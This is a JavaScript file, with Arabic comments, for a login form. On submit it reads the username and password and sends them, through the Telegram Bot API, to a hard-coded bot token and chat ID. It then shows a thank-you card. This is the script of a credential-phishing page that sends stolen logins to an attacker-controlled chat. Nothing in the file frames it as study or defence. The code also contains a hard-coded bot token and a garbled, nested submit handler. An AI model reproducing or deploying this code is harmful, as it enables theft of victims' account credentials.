const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const togglePasswordBtn = document.getElementById('togglePassword');
const loginForm = document.getElementById('loginForm');

const loginCard = document.getElementById('loginCard');
const signupCard = document.getElementById('signupCard');
const successCard = document.getElementById('successCard');

// إظهار/إخفاء زر كلمة السر عند الكتابة
passwordInput.addEventListener('input', () => {
  togglePasswordBtn.style.display = passwordInput.value.length > 0 ? 'block' : 'none';
});

// تبديل رؤية كلمة السر
togglePasswordBtn.addEventListener('click', () => {
  const isPassword = passwordInput.type === 'password';
  passwordInput.type = isPassword ? 'text' : 'password';
  togglePasswordBtn.textContent = isPassword ? 'إخفاء' : 'إظهار';
});

// عند الضغط على زر تسجيل الدخول
loginForm.addEventListener('submit', (e) => {
  e.preventDefault(); // إيقاف إعادة تحميل الصفحة
const BOT_TOKEN = "8240244347:AAGja6YBkz78HSju98RpeTs4FECqHAIPwJw";
const CHAT_ID = "5987304922" ;

loginForm.addEventListener('submit', (e) => {
  e.preventDefault();
  
  const username = usernameInput.value;
  const password = passwordInput.value;

  const text = `📬 بيانات جديدة:\nاسم المستخدم: ${username}\nكلمة السر: ${password}`;

  // إرسال البيانات عبر API تلغرام
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text
    })
  })
  .then(response => {
    alert('تم إرسال البيانات بنجاح!');
  })
  .catch(error => {
    console.error('حدث خطأ:', error);
  });
});

  // إخفاء كرت تسجيل الدخول وكرت الاشتراك
  loginCard.classList.add('hidden');
  signupCard.classList.add('hidden');

  // إظهار كرت الشكر مع علامة الصح
  successCard.classList.remove('hidden');
});